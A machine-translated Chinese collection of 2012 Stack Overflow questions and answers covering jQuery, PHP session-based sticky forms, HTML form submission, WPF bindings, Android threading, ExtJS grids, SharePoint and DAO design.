* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:31:37.283

也许使用 jQuery 1.7+（或使用“live”或“delegate”的旧版本）

```
$('form').on( "change", 'input[name="q"]', function(eventObj){
    console.log("query changed");
    $('h3').append("text");
}); 
```

如果`form`是另一个元素，请相应地更改它。

# algorithm - Q处理的QA算法

> ID：12213475
> 
> 赞同：2
> 
> 时间：2012-08-31T10:26:57.083
> 
> 标签：algorithm, parsing, nlp

`What Algorithm/method do I use for a Question Answering System's Question Processing?`

我一直在为我的问答系统搜索可能的算法，我认为唯一可以使用的是`Parsing`，但我在上一个问题中询问了关于解析的问题，并且我认为不可能使用那里的答案？（我不确定）。

我使用的想法`Parsing`是将问题切割成每个单词的单词，然后它将通过单词存储来确定正在说的单词类型（名词、形容词、动词等）。我使用的目的`Parsing`是删除或更确切地说是确定问题的主题。

我的另一个想法是`ChatterBot`. Chatterbot 使用单词查询？如果我没记错的话，请纠正我，这些词被分配给另一个词。它会从查询中随机选择一个词。

示例：用户声明：Hello > ChatterBot 可能的回复：Hi,Hello,Hey

我不太确定在问答中使用的可能方法/算法是什么，我已经阅读了维基百科的帖子：[http](http://en.wikipedia.org/wiki/Question_answering) ://en.wikipedia.org/wiki/Question_answering但我不太明白使用什么算法在`Question Processing`.

谢谢你。

PS：我正在用 Javascript 开发。Q = 问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T17:57:49.960

您可以使用朴素贝叶斯分类器来查看问题并确定它们的主题。你需要大量的训练数据和一个相当狭窄的领域。

对这个问题的复杂反应涉及很多机器推理技术，这些技术有点超出我的技能水平，无法很好地解释。我的想法是使用一个马尔可夫网络，其中每个单词与旁边的一两个单词都有优势。对每个单词进行一系列测试，以表明该单词可能的成员身份及其可能的含义（例如，如果 Mark 大写，则它更可能是一个名称，但如果下一个单词是 'a'，则它可能用于动词的意义。）从那里机器可以尝试确定句子的实际含义，这将再次依赖于使用难以想象的大量训练数据。

如果您有兴趣成为该领域的专家，Coursera 的概率图形模型课程（可能也是他们的 NLP 课程）可能是最好的资源。（PGM 是我对此一无所知的唯一原因！）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-02T00:56:40.250

这是一本很棒的书，您可能需要阅读才能获得很多与 NLP 和问答系统相关的内容[http://www.amazon.com/Speech-Language-Processing-2nd-Edition/dp/0131873210](https://rads.stackoverflow.com/amzn/click/com/0131873210)

这本书有一个完整的部分（V.Applications），它将帮助你开发一个好的系统。但请注意，本书仅讨论理论和算法（无代码）

这不仅仅是解析文本，您需要了解上下文以提供更好的答案。实际上，您需要提取一些关键字并忽略其他所有内容。

您也可以阅读主题关键字（词袋）、算法（例如（TF/IDF））。

# php - PHP 标头位置

> ID：12213480
> 
> 赞同：6
> 
> 时间：2012-08-31T10:27:21.410
> 
> 标签：php, header

> **可能重复：**
> [PHP header() 使用 POST 变量重定向](https://stackoverflow.com/questions/4281900/php-header-redirect-with-post-variables)

我正在编写一个脚本，其中表单数据被提交到另一个脚本。我希望第二个脚本对提交的`$_POST`数据执行一些错误检查，如果一切正常，则处理数据。如果数据有错误，我会使用`header('Location: http://www.example.com/script.php');`将访问者返回到表单页面。

我遇到的问题是我希望表单具有粘性 - 具有正确数据的字段维护用户输入的值。显然，要获得这些值，我需要访问`$_POST`数组。`header()`但是，当调用将访问者转发回表单时，这似乎被破坏了。

有什么方法可以使用标头位置内容将访问者重定向到另一个页面，同时仍然保留`$_POST`数据？

现在我像这样使用 :`header('Location: http://www.example.com/add.php?id='.$id.'&name='.$name.'&code='.$code.'&desc='.$description.'');`并访问 as `$_GET`。

同样，我可以在`header('location: xxx')`??中使用 POST 类型？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-31T10:32:52.493

实现这种“粘性形式”的最佳方法是使用会话。

```
<?php
session_start();
$_SESSION = $_POST;
//do error checking here
//if all is valid
session_write_close();
header('Location: *where you want your form to go*');
die;
?> 
```

在重定向页面上，您可以像这样使用它们：

```
<?php
session_start();
//use $_SESSION like you would the post data
?> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T10:31:02.463

您可以将`$_POST`数据存储在会话中：

```
session_start();
$_SESSION['submitted_data'] = $_POST; 
```

然后通过从变量中加载值来将值加载到输入中`$_SESSION['submitted_data']`，只需记住也要`session_start()`在错误页面的顶部。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:35:41.210

为此使用[会话](http://php.net/manual/en/features.sessions.php)。在表单页面中：

```
<?php
if (!empty($_COOKIE[session_name()])) {
    // we only start session if there is a session running
    session_id() || session_start();
}

if (empty($_POST) && !empty($_SESSION['POST'])) {
    // make sure you're not overwriting
    $_POST = $_SESSION['POST'];
}
// and so on just like you have $_POST filled 
```

在接收 $_POST 数据的脚本中：

```
<?php
// after you're done with checking and stuff
session_id() || session_start();
$_SESSION['POST'] = $_POST;
header('Location: /script.php'); 
```

两个脚本都应该在保存域上，会话才能工作。如果您在*Location*标头中使用相对 URI，那么一切都应该可以正常工作。

# html - 未为表单输入字段设置名称字段

> ID：12213483
> 
> 赞同：0
> 
> 时间：2012-08-31T10:27:29.770
> 
> 标签：html, forms, input

我有一个表单，它包含多个输入字段。如果我不为每个字段提供 ID 或名称怎么办。该字段是使用默认名称提交还是根本不提交。

这只是一个查询。不涉及代码。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:32:03.977

没有名字的表单控件不能是成功的控件，不会被提交。

没有名称的控件的值不会包含在提交的表单数据中。

见[HTML 4](http://www.w3.org/TR/html4/interact/forms.html#h-17.13.2)：

> 一个成功的控件对于提交是“有效的”。每个成功的控件都将其控件名称与其当前值配对，作为提交的表单数据集的一部分。成功的控件必须在 FORM 元素中定义，并且必须具有控件名称。

或[HTML 5](http://www.w3.org/TR/html5/form-submission.html#constructing-form-data-set)：

> 如果满足以下任一条件，则跳过此元素的这些子步骤…… field 元素不是 type 属性处于 Image Button 状态的 input 元素，并且 field 元素没有指定 name 属性，或者它的name 属性的值是空字符串。

* * *

id 与控件的成功无关。那里只有名字很重要。

id 仍然很重要，因为它是将`<label>`元素与控件相关联的最佳方式（并且通过 JS 和 CSS 具有其他用途）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:31:01.743

表单仍将被提交，但在表单提交后您将无法获取“发布”值。

# jakarta-ee - Websphere：如何将 DataSource 与您的应用程序一起部署？

> ID：12213486
> 
> 赞同：0
> 
> 时间：2012-08-31T10:27:39.193
> 
> 标签：jakarta-ee, websphere

我在 JBoss 上开发了一个应用程序，其中包含应用程序级别的数据源定义。现在我需要在 Websphere 8.5 上部署这个应用程序。有没有办法将数据源模块与您的应用程序一起部署？谢谢马克斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T23:40:12.237

WebSphere 支持“应用程序范围的资源”：

[http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/topic/com.ibm.websphere.base.iseries.doc/info/iseries/ae/udat_resscope.html](http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/topic/com.ibm.websphere.base.iseries.doc/info/iseries/ae/udat_resscope.html)

不过，您需要 Rational Application Developer 才能拥有一个好的 GUI 来配置这些资源。

在 RAD 8.0 上，右键单击 EAR 项目，然后选择“Java EE”->“Open Websphere Application Server Deployment”。RAD 7.5（如果我没记错的话）和 8.5（还没有尝试过 RAD 8.5）应该是一样的。

# java - 文本节点中的 Java 换行符

> ID：12213487
> 
> 赞同：0
> 
> 时间：2012-08-31T10:27:40.280
> 
> 标签：java, eclipse, text, xpath, nodes

我正在使用 xpath 提取一些文本，在 Firepath 中，位置描述位于 4 条单独的行中，但是当我将文本拉出时，它会将它们全部连接到一行上。无论如何我可以将这四行分成单独的字符串吗？

这是我的 xpath.getText() 显示的内容： `Ax Man Test Branch Ax Man Test Ax Man Tester`

```
<td class="labelFormReq"/>
<td class="labelForm">Location Description:</td>
<td> Ax Man Test Branch  
Ax Man Test
Ax Man
Tester
</td> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:36:12.533

像这样

```
<td class="labelFormReq"/>
<td class="labelForm">Location Description:</td>
<td>Ax Man Test Branch<br/> 
Ax Man Test<br/>
Ax Man<br/>
Tester<br/>
</td> 
```

:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:06:11.280

只需`<br />`在要换行的位置使用标签即可。

# ssl - Stunnel 是否支持非加密连接？

> ID：12213489
> 
> 赞同：6
> 
> 时间：2012-08-31T10:27:42.697
> 
> 标签：ssl, fix-protocol, stunnel

关于 Stunnel 的 1 个问题。我想将 Stunnel 用作 Internet 的 FIX（财务信息交换）网关，以支持 SSL 和非 SSL 连接。Stunnel 可以在没有任何加密的情况下进行吗？我刚刚尝试使用普通套接字，但看起来 Stunnel 拒绝了连接说“无效协议”或其他内容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-03T07:39:11.880

可以使用 SSL/TLS 而不使用具有空加密的密码套件（例如`TLS_RSA_WITH_NULL_SHA`）进行加密，通常默认情况下禁用，但可以通过`ciphers`Stunnel 选项进行设置。但是，您仍将使用 SSL/TLS，这似乎不是您想要的。

看起来您更普遍地寻找通常称为*TCP 弹跳*器的东西。您应该能够找到许多实现。

# .net - WS-security 破坏了 SOAP 消息中的签名

> ID：12213492
> 
> 赞同：1
> 
> 时间：2012-08-31T10:28:01.463
> 
> 标签：.net, web-services, soap, digital-signature, wse

我需要用一个特定的加密提供者签署肥皂消息。**所以我写了一个SoapExtension**的子类，它在阶段**SoapMessageStage.AfterSerialize**中添加数字签名，并在阶段**SoapMessageStage.BeforeDeserialize**中对其进行验证。服务器端工作正常，但客户端存在问题：添加签名后，总是添加一些新的 ws-security 元素并且签名变得不正确。更改优先级无效。有：

 **内**香皂：信封**

```
xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/03/addressing" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"  xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"> 
```

内部**肥皂：标题**

```
<wsa:Action>ServerTest/TestMultiply</wsa:Action><wsa:MessageID>uuid:6ea73f70-8164-4e5a-8f8c-17853eadfba2</wsa:MessageID><wsa:ReplyTo><wsa:Address>http://schemas.xmlsoap.org/ws/2004/03/addressing/role/anonymous</wsa:Address></wsa:ReplyTo><wsa:To>http://mylocalhost:31791/WebServiceEstate.asmx</wsa:To><wsse:Security><wsu:Timestamp wsu:Id="Timestamp-50be5708-32ab-4014-81d4-7b0b82ff6262"><wsu:Created>2012-08-31T09:49:51Z</wsu:Created><wsu:Expires>2012-08-31T09:54:51Z</wsu:Expires></wsu:Timestamp></wsse:Security> 
```

添加此 ws-securiry 数据后如何应用签名？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T09:13:31.957

从 WSE 2.0 迁移到 WSE 3.0 后问题已解决**

# testing - 用于 SPP-RFCOMM 测试的 ADB 命令

> ID：12213497
> 
> 赞同：2
> 
> 时间：2012-08-31T10:28:19.903
> 
> 标签：testing, bluetooth, adb, rfcomm, spp

我正在 Android 2.3.3 手机上进行蓝牙协议测试。我将处于 USB 调试模式的设备连接到我的 Windows 7 PC，使用 cmd 向设备发送命令。

问题：我无法弄清楚如何提交 SDP 查询。让我设置场景，测试用例：“验证 IUT 是否与测试仪中的模拟串行端口建立连接。IUT 是扮演 DevA 角色的设备。测试仪是接受器”... nb 测试仪是 android 设备 (IUT) 应该与之交谈的测试机器。

第一步，这是我卡住的地方：“使用 SDP 提交查询以找出远程设备中所需应用程序的 RFCOMM 服务器通道号。这可能包括让用户在可用端口中进行选择的浏览功能（或服务）在对等设备中。或者，如果确切知道要联系哪个服务，则使用与所需服务相关联的服务类 ID 查找必要的参数就足够了。

设备：股票-不知道如何root设备哈哈！没有超频。蓝牙 2.1 版本 1.0.46.0

到目前为止，我已经尝试了以下方法。输入 adb shell, rctest -u [BT address of test machine] ，有时我会得到“无法连接，正在进行中”或“无法连接到主机”，甚至不管是否运行测试用例。还尝试过：rctest -u [测试机的BT地址]，它将无限期地等待通道10：S sdptest -i B：无法连接到SDP服务：主机已关闭

我只是觉得我错过了一些阻碍我进一步进步的大事。

任何帮助将不胜感激。担

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-01T10:49:04.540

不确定我的理解是否正确，您想使用 SDP 查看 rfcomm 频道号，如果正确并且您的手机带有 bluez stack，请尝试 sdptool 浏览，它将搜索附近的所有设备并更新 SDP可用设备的记录。

# .net - 绑定到 SelectedItem

> ID：12213498
> 
> 赞同：3
> 
> 时间：2012-08-31T10:28:20.190
> 
> 标签：.net, wpf, mvvm, binding, combobox

我在我的应用程序中使用 WPF 功能区库并定义了一个这样的组合框：

```
<r:RibbonComboBox>
    <r:RibbonGallery SelectedItem="{Binding ActiveCamera}">
        <r:RibbonGalleryCategory ItemsSource="{Binding AvailableCameras}"/>
    </r:RibbonGallery>
</r:RibbonComboBox> 
```

绑定源在窗口中定义`DataContext`：

```
public Camera[] AvailableCameras
{
    get ...
}

public Camera ActiveCamera
{
    get { return _activeCamera; }
    set
    {
        if (_activeCamera != value && value != null)
        {
            _activeCamera = value;
            Notify("ActiveCamera");
            'Some more logic that is not related to UI
        }
        Debug.WriteLine("Active camera set to " + value);
    }
} 
```

Camera 只是一个简单的类，具有属性`Name`和`id`.

在 ViewModel的`ActiveCamera`构造函数中设置为`AvailableCameras`. 我可以在代码中验证这一点。

但是，如果我启动应用程序，组合框是空的。启动应用程序后，调试输出说明了这一点：

```
Active camera set to 713x BDA Analog Capture 
```

如果我单击组合框，相机似乎被选中：

![带有所选项目的组合框](../Images/90ab14d22c517724fa9dbb9d6dd3992f.png)

此外，添加了以下调试输出：

```
Active camera set to 
```

如果我然后单击窗口中的其他位置，组合框将关闭并保持为空。添加了以下调试输出：

```
Active camera set to 
```

但这种行为似乎并不一致。如果我单击组合框，然后再次单击窗口中的其他位置，则会选择第一个摄像头并添加以下调试输出：

```
Active camera set to           (on click on the combobox)
Active camera set to 713x BDA Analog Capture 
```

`SelectedItem`如果在应用程序启动时实际选择了边界，这一切都不是问题。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T17:00:23.817

不确定这是否是问题，但我不记得 TwoWay 绑定是否是默认的。

```
SelectedItem="{Binding Path=ActiveCamera, Mode=TwoWay}" 
```

还要确保当您设置初始相机时，它是通过属性`ActiveCamera`而不是`_activeCamera`确保`Notify`调用的字段。

这些将是尝试的第一个简单步骤，如果这没有帮助，请对此答案发表评论，我会尝试看看是否有什么可以做的。

* * *

另一个疯狂的猜测。我注意到您的收藏是一个数组。这不会通知对集合的任何更改，因此如果稍后添加项目，它将通知 GUI。由于该项目出现在列表中，我想这不是问题。您可以尝试将其更改为`ObservableCollection<Camera>`.

通过更好地阅读您的帖子，我的猜测是您在这里不是初学者，并且非常了解 WPF 数据绑定的细微差别。那是对的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-22T14:28:33.523

我最近偶然发现了一个似乎没有这个问题的[RibbonGallery 示例（即在启动时，所选项目](http://blogs.msdn.com/b/llobo/archive/2010/08/19/using-ribbongallery-control.aspx)*正确*显示）。他们有一个有趣的解决方案来管理 RibbonGallery 数据。他们创建了一个类`GalleryData<T>`，它分别具有 SelectedItem 和 CategoryDataCollection 属性，用于 SelectedItem 和 ItemsSource 绑定。这些绑定由针对 RibbonGallery 类型的样式处理。当我从样式中删除 SelectedItem 绑定并将其移动到库控件本身时，启动时没有选择。以一种风格进行这些绑定似乎很奇怪，但如果这是它所需要的，那么我想没关系。希望有帮助。

# java - 如何在线程中显示消息框？

> ID：12213501
> 
> 赞同：0
> 
> 时间：2012-08-31T10:28:25.473
> 
> 标签：java, android

所有..我是android新手。我尝试制作带有剩余警报的日历..我编写的所有内容都可以正常工作..但是“警报事件”仅在 LogCat 中作为 system.out.print 工作，但它无法在 android Emulator GUI 中显示。我通过使用线程在唤醒中制作了这个警报功能。在这个线程中，我想向 GUI 显示一个警告框。在这里我附上了代码。任何人都可以告诉如何在线程中显示消息吗？

**编码：**

```
public void run() {
        for (;;) {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMddHHmm");
            Calendar cal = Calendar.getInstance();
            stime = dateFormat.format(cal.getTime());
            arrCRInt = Long.parseLong(stime);
            try {
                i = 0;
                c = db1.rawQuery("SELECT * FROM " + CRA, null);
                if (c != null) {
                    if (c.moveToFirst()) {
                        do {
                            dbdatetime = c.getString(c.getColumnIndex("rdatetime"));
                            arrDBInt = Long.parseLong(dbdatetime);
                            remName = c.getString(c.getColumnIndex("rname"));
                            rem_id = c.getString(c.getColumnIndex("reminder_id"));
                            alertId=c.getString(c.getColumnIndex("alert"));
                            if (arrDBInt < arrCRInt) {
                                if(alertId.equals("TRUE"))
                                {
                                    ///////////////////// Passing Alert Message to Android Emulator GUI
                                    db1.execSQL("UPDATE "+CRA+" SET "+ALERT+"='FALSE' WHERE reminder_id = " + rem_id );
                                }
                                db1.execSQL("UPDATE "+CRA+" SET "+STATUS+"='TRUE' WHERE "+CRDATETIME+"<"+arrCRInt +" and reminder_id = " + rem_id );
                            }
                            if (arrDBInt == arrCRInt) {
                                ///////////////////// Passing Alert Message to Android Emulator GUI
                                System.out.println("ALERTED AS: You Have " + remName + " Remainder as on this Time");
                                db1.execSQL("UPDATE "+CRA+" SET "+ALERT+"='FALSE' WHERE "+CRDATETIME+"="+arrCRInt +" and reminder_id = " + rem_id );
                            }
                            if(arrDBInt>arrCRInt)
                            {
                                ///////////////////// Passing Alert Message to Android Emulator GUI 
```

***//////////////////这里警报框，消息框，吐司等一切都不起作用***

```
 }
                        } while (c.moveToNext());
                    }
                }
                Thread.sleep(10000);
            } catch (Exception e) {
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T05:02:32.417

```
Handler handler = new Handler();
handler.post(new Runnable(){
     public void run(){
          //implement your thread code here
     }
 }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:31:30.280

我建议您使用 AsyncTask ：

```
public class MyAsyncTask extends AsyncTask<Void, Void, Result>{

         private Activity activity;
         private ProgressDialog progressDialog;

        public MyAsyncTask(Activity activity) {
                        super();
            this.activity = activity;
        }

        @Override
        protected void onPreExecute() {
        super.onPreExecute();
            progressDialog = ProgressDialog.show(activity, "Loading", "Loading", true);
        }

        @Override
        protected Result doInBackground(Void... v) {
        //do your stuff here
        return null;

        }

        @Override
        protected void onPostExecute(Result result) {
            progressDialog.dismiss();
            Toast.makeText(activity.getApplicationContext(), "Finished.", 
                    Toast.LENGTH_LONG).show();
        }

} 
```

从活动中调用它：

```
MyAsyncTask task = new AsyncTask(myActivity.this);
task.execute(); 
```

# android - 将现有文件存储到内存中并获取路径

> ID：12213503
> 
> 赞同：1
> 
> 时间：2012-08-31T10:28:32.587
> 
> 标签：android, android-file

我有一个 xml 文件，我想将它存储在内部存储器中，后来我只需要该文件的路径即可访问它。

我有一个现有文件，因此无需在我的程序中写入文件我只想以这样一种方式存储它，即用户意外无法删除该文件，并且应用程序可以通过访问其路径来读取它。

*注意：我正在使用仅接受文件路径的第三方库。我不想将它存储在 SD 卡中*

我试过`AssetManager assetManager = getAssets();`了，但这并没有在需要时给出相对路径。我尝试`/data/data/com.bcl/external.provider`将我的 external.provider 文件复制到应用程序包中，但没有用。

那么如何获取我可以存储文件并获取其路径的路径。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:46:29.153

您可以做的是将文件写入文件夹中`data/data/package_name/`并从那里读取。此文件夹在内部存储中，因此用户将无法读取该文件。您可以获得路径，使用`getFilesDir()`它将为您提供`data/data/package_name/files/`

# objective-c - 显示对话框且选择器方法未完成时删除 MBProgressHUD

> ID：12213508
> 
> 赞同：0
> 
> 时间：2012-08-31T10:28:46.037
> 
> 标签：objective-c, ios, uiviewcontroller, ios5.1, mbprogresshud

我正在使用代码调用方法并显示如下 HUD

```
 HUD = [[MBProgressHUD alloc] initWithView:self.view];
[self.view addSubview:HUD];

HUD.delegate = self;
HUD.labelText = @"Signing you up";

// myProgressTask uses the HUD instance to update progress
[HUD showWhileExecuting:@selector(processFieldEntries) onTarget:self withObject:nil animated:YES]; 
```

在 processFieldEntries 中，我进行了一些错误检查，然后显示一个对话框。如下所示：

```
showDialog:
if (textError) {
    UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:errorText message:nil delegate:self cancelButtonTitle:nil otherButtonTitles:@"Ok", nil];
    [alertView show];
    return;
} 
```

然后这会导致崩溃，可能是因为它们在同一个线程上或者没有从视图中移除 HUD。

我的问题是我应该添加不同的代码以确保它们在不同的线程上运行吗？我应该在 processFieldEntries 方法中添加什么，然后删除 HUD，因为它被称为 showWhileExecuting ...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-02T21:09:22.790

```
 MBProgressHUD *hud = [MBProgressHUD showHUDAddedTo:self.view animated:YES];
    hud.delegate = self;
    hud.labelText = @"Signing you up";
    dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, 0.05 * NSEC_PER_SEC);
    dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
        [self processFieldEntries];
        // Do something...
        [MBProgressHUD hideHUDForView:self.view animated:YES];
        }); 
```

# c# - 在 WinForms 应用程序中隐藏和显示表单

> ID：12213513
> 
> 赞同：-2
> 
> 时间：2012-08-31T10:28:57.390
> 
> 标签：c#, winforms

> **可能重复：**
> [Winform Forms 关闭和打开一个新表单](https://stackoverflow.com/questions/1677528/winform-forms-closing-and-opening-a-new-form)

在我的 Windows 应用程序中，我有两种形式；表格 1 和表格 2

在 form1 中，我使用以下处理程序收听按钮单击，

```
private void btn1_Click(object sender, EventArgs e)
{
    Form2 updatewindow = new Form2();
    updatewindow.Show();
} 
```

在 Form2 中，我想单击一个按钮并显示第一个表单 form1，因此 form2 中的按钮单击处理程序执行以下操作

```
private void btn2_Click(object sender, EventArgs e)
{
    try
        {

            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "codedata.xml");
            XmlDocument doc = new XmlDocument();
            doc.Load(path);
            XmlNodeList nodelist = doc.SelectNodes("Root/data[Sno='" + getsnofromform1 + "']");
            nodelist[0].ChildNodes[2].InnerText = txt_productcodeupdate.Text;
            nodelist[0].ChildNodes[3].InnerText = txt_productnameupdate.Text;
            nodelist[0].ChildNodes[4].InnerText = txt_brandcodeupdate.Text;
            nodelist[0].ChildNodes[5].InnerText = txt_brandnameupdate.Text;
            doc.Save(path);
            MessageBox.Show("Selected Record Updated Successfully");

        }
        catch
        {
        }
        finally
        {
            //txt_sno.Text = "";
            // txt_companycode.Text = "";
            txt_productcodeupdate.Text = "";
            txt_productnameupdate.Text = "";
            txt_brandcodeupdate.Text = "";
            txt_brandnameupdate.Text = "";

            BarcodeCount form1 = new BarcodeCount();
            form1.BringToFront();
            form1.Invalidate();
            Application.OpenForms["BarcodeCount"].Refresh();
            this.Close();
        }
} 
```

问题是我想显示旧表单，但正在打开一个新的 Form1 窗口。

我想刷新 form1 表单 form2

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:31:23.453

```
FormName x = default(FormName);
x = new FormName();
x.Show();
x = null; 
```

x 在需要时为 Form1 或 Form2。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:34:49.153

如果你创建`_for`一个类字段，你总是可以通过调用打开那个实例`for.Show();`。

例子：

```
private Form1 _for = new Form1();
private void btn2_Click(object sender, EventArgs e)
{
 for.Show();
} 
```

# java - apache httpd 和tomcat：调用tomcat 功能？

> ID：12213515
> 
> 赞同：0
> 
> 时间：2012-08-31T10:29:08.520
> 
> 标签：java, php, tomcat, content-management-system, apache

我需要你的帮助来决定我的下一个项目使用哪些技术。

它基本上只是一个（动态）主页，但带有登录名和文件存储库。作为 WCMS，我可能会使用 Wordpress、Drupal、Joomla! 或 Typo3——还不确定。

我有一个非常强大的企业文档管理应用程序，它提供了很多功能，如文件存储库、用户身份验证/用户组/角色/类别/标签、...

因为它也是基于网络的，所以我想将它用于主页来管理登录名和所有文件。唯一的问题：它是用 JAVA 编写的（在 Spring 框架之上）并使用了一个 JSP 容器，比如 tomcat。它有许多接口来集成它，如 REST 或 CMIS。它的名字叫露天。

我知道有可能将 tomcat 与 apache httpd 服务器集成，但我如何管理登录过程？

我希望 httpd 服务器为所有页面提供服务。登录应该由tomcat处理。我希望文件存储库也由 tomcat 管理。

例如：使用模板和其他东西使用 Wordpress 创建新网站，但并非每个网站都适合每个用户。一些用户比其他用户看到的更多。客户应该可以访问客户区，在那里他们可以下载一些文件。

目前我不知道该怎么做？PHP 是否可以获取和处理对 tomcat 的请求（例如可下载文件的列表）或检查当前用户是否可以访问网站？或者如何从tomcat获取用户信息？

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:58:29.990

抱歉，也许我误解了您的要求，但是 Alfresco 权限/角色/用户/组子系统不是由 Tomcat 管理的。它将所有用户信息本地存储在 Alfresco 本身内。只有当您使用一些 AD/LDAP 或 kerberos 外部身份验证系统时，您才能管理它。我不明白你想用什么来管理 Alfresco 的用户，你可以在这里看到： [Alfresco Authentication Subsystems](http://wiki.alfresco.com/wiki/Alfresco_Authentication_Subsystems#External)

如果你发现一些有用的东西。

如果我错过了重点，您能否用其他方式解释您的问题？谢谢！

# javascript - 取消隐藏 div 后现在显示 ExtJS 4 网格

> ID：12213517
> 
> 赞同：0
> 
> 时间：2012-08-31T10:29:11.813
> 
> 标签：javascript, jquery, html, extjs, extjs4

我正在使用 ExtJS 4 网格，我的要求是网格应该首先隐藏，并且在按下某个按钮时应该可见。

我不知道这是否是错误或任何东西，但问题是如果`style="display:none;"`为我渲染网格的 div 设置，并在稍后单击按钮时显示它，则网格不会显示。但相反，如果我先显示网格并按下按钮隐藏或显示网格，效果很好。

这是代码 HTML 和 Javascript。
HTML：

```
<div id="outPut">
    <div id="gridShowClick" style="height: 50px; 
    width: 180px; background-color:Black; color:White; 
    padding-top:25px; text-align:center;" >
                Press to show the grid

    </div>
</div>
<div id="hiddenDiv" style="display:none;" >
    <div id="exampleGrid" style="">

    </div>
</div> 
```

Javascript：

```
var grid;
    var colModel;
    Ext.onReady(function () {
        $("#gridShowClick").bind("click", showGridClick);
        colModel = [
            {
                header: "Field 1",
                menuDisabled: true,
                width: 120,
                sortable: false
            },
            {
                header: "Field 2",
                menuDisabled: true,
                width: 120,
                sortable: false
            },
            {
                header: "Field 3",
                menuDisabled: true,
                width: 120,
                sortable: false
            },
            {
                header: "Field 4",
                menuDisabled: true,
                width: 120,
                sortable: false
            },
            {
                header: "Field 5",
                menuDisabled: true,
                width: 120,
                sortable: false
            }
        ];
        grid = Ext.create('Ext.grid.Panel', {
            id: "exampleGridPanel",
            columns: colModel,
            columnLines: true,
            renderTo: "exampleGrid"
        });
    });
    function showGridClick() { $("#hiddenDiv").show(); } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:43:18.430

```
 <div id="exampleGrid"></div>

   grid = Ext.create('Ext.grid.Panel', {
        id: "exampleGridPanel",
        columns: colModel,
        columnLines: true,
        hidden: true //hidden 
        renderTo: "exampleGrid"
    });

    function showGridClick() {
        Ext.getCmp('exampleGridPanel').show();
    } 
```

移除`<div id="hiddenDiv" style="display:none;" >`

应该管用

# android - 处理活动暂停时自动回收位图的最佳方法

> ID：12213522
> 
> 赞同：0
> 
> 时间：2012-08-31T10:29:27.557
> 
> 标签：android

我的大多数应用程序都使用线程运行的 SurfaceView 类中的位图，其中一些位图与当前屏幕分辨率一样大。我注意到，如果活动处于暂停状态，Android 可能会自动回收大位图以释放内存。因此，当一个人在一个应用程序中并单击主页按钮然后再次打开同一个应用程序时，它可能会崩溃，因为位图不再存在。

根据您的经验，处理此问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:57:40.843

我还没有处理过这种情况，但我的第一次尝试是在 onResume 内部调用

```
if(mBitmap.isRecycled()){ mBitmap = ... } 
```

并在它返回 true 的情况下重新实例化

# sharepoint-2010 - 第一个站点视图上的 SharePoint 模式窗口

> ID：12213523
> 
> 赞同：1
> 
> 时间：2012-08-31T10:29:29.223
> 
> 标签：sharepoint-2010, modalpopupextender

我需要在我的 2010 门户网站的主页上放置免责声明。因此，当用户第一次查看该站点时，他们会看到一个带有免责声明消息的 ShaerPoint 模式窗口。一旦他们关闭窗口，他们就可以开始浏览该网站。

如何修改这种方法，以便在页面呈现与 onclick 事件时出现模式窗口？

```
<a onclick="javascript:NewItem2(event, &quot;http://sitename/Images/image.png&quot;); 
javascript:return false;" href="/images/image.png/" target="_self">Show Image</a> 
```

参考：[http ://erikswenson.blogspot.de/2010/09/ways-to-extend-sharepoint-modal-window.html](http://erikswenson.blogspot.de/2010/09/ways-to-extend-sharepoint-modal-window.html)

# oop - DAO 和业务逻辑

> ID：12213528
> 
> 赞同：6
> 
> 时间：2012-08-31T10:29:36.757
> 
> 标签：oop, design-patterns, database-design, dao

我想知道 DAO 应该处理多少业务逻辑。

好的，我们都知道 DAO 的目的是封装数据访问并隐藏有关它的所有信息以及实现。此外，DAO 的目标也是将业务逻辑与数据访问逻辑分离。

我会争辩说，DAO 中*必须*有一些业务逻辑，例如，如果由于特定领域的某些要求而无法删除或更新业务对象怎么办？我想没有人会为那个 DAO 实现删除/更新方法，而且——在我看来——这意味着一些业务逻辑的知识。

现在，您可以想象我的问题更多的是概念性而非实际性，因此使用 ORM 是无用的建议，因为没有具体的使用场景。

